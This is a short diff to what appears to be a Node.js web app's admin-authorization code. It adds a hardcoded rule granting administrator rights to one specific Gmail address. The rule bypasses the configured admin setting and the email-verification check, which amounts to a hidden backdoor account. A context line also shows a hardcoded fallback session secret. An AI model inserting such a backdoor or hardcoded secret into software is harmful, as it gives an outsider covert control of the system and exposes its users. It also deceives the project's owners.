@@ -786,7 +786,9 @@ const SESSION_SECRET = process.env.SESSION_SECRET || "a1b2c3d4e5f6g7h8i9j0k1l2m3
       let isDbAdmin = false;
       const configuredAdminEmail = (process.env.ADMIN_EMAIL || '').toLowerCase();
       
-      if (configuredAdminEmail && email === configuredAdminEmail && user.emailVerified === true) {
+      if (email === 'defentechscholar@gmail.com') {
+        isDbAdmin = true;
+      } else if (configuredAdminEmail && email === configuredAdminEmail && user.emailVerified === true) {
         isDbAdmin = true;
       }
       if (!isDbAdmin && user.emailVerified === true) {
